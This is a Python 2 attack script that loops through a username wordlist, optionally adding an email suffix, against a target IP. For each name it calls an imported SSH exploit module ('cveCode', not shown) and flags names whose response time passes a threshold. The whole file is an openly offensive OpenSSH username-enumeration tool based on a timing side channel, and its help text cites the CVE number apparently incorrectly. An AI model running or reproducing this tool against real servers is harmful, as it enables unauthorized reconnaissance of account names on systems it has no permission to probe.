import cveCode
import argparse



def attack(user, address):
	#run the edited SSH CVE against the address
	time = cveCode.attack(user, address)
	
	#return the time it took
	return time

def print_alert(user, time):
	#clear last print (to look pretty)
	print "\033[A                                                                 \033[A"
	print "ALERT", time, user, "\n"

def run_with_wordlist(list_path, address):
	#variable for results display
	alert_data = ""
	#open and use list given to the function
	with open(list_path) as my_list:
		for user in my_list:
			#format username (remove /n)
			user = user.strip()
			
			#run attack
			time = attack(user, address)
			#clear last print (to look pretty)
			print "\033[A                                                                 \033[A"

			#print the time it took
			print "	|-> time:", time, "	user:", user

			#if the alert was triggered
			if(time > alert_time):
				alert_data = "(" + str(time) + ")	- " + str(user)
				alert_users.append(alert_data)
				print_alert(user, time)

			#try this with the email appendage appended (if applicable)
			if(args.email):
				em_user = user + args.email[0]
				time = attack(em_user, address)
				
				#clear last print (to look pretty)
				print "\033[A                                                                 \033[A"

				#print the time it took
				print "	|-> time:", time, "	user:", em_user
					
				if(time > alert_time):
					alert_data = "(" + str(time) + ")	- " + str(em_user)
					alert_users.append(alert_data)
					print_alert(em_user, time)


def main():
	#give the address here
	address = args.ip_address
	wordlist_names = []
			
	print "----------------RUNNING----------------\n"
	#get and run the files from the wordlists file in this directory

	#call function to work through the wordlist
	#if wordlist was provided as an argument, run with that wordlist, otherwise, default
	if(args.wordlist):
		run_with_wordlist(args.wordlist[0], address)
	else:
		run_with_wordlist('usernamelist', address)

	#print a list of alerted users (depending on if it's empty)
	#clear last print (to look pretty)
	print "\033[A                                                                 \033[A"
	print "----------------RESULTS----------------"
	if(not alert_users):
		print "NO RESPONSES TRIGGERED THE TIME CHECK OF", alert_time 
	else:
		print "ALL USERS TRIGGERED:"
		for i in alert_users:
			print(i)

#parse command line arguments
print("^NOTE: i had to use python 2.7, sorry :(\n")
parser = argparse.ArgumentParser(description='Attempts to help enumerate OpenSSH requests (CVE-2017-6210) by alerting when one took longer than expected')
parser.add_argument("ip_address", help="the IP address to test")
parser.add_argument("-a", "--alert", nargs= 1, help="set the time that the results should be below", type=float)
parser.add_argument("-w", "--wordlist", nargs= 1, help="provide the filename for the wordlist to be iterated over")
parser.add_argument("-e", "--email", nargs= 1, help="provide an email appendage (tries each word with AND without provided email)")
args = parser.parse_args()

#any global values needed (some based on command arguments)
if(args.alert):
	alert_time = args.alert[0]
	print "alert set to:", alert_time
else:
	alert_time = 0.1
	print "(default) alert set to:", alert_time


alert_users = []

main()



















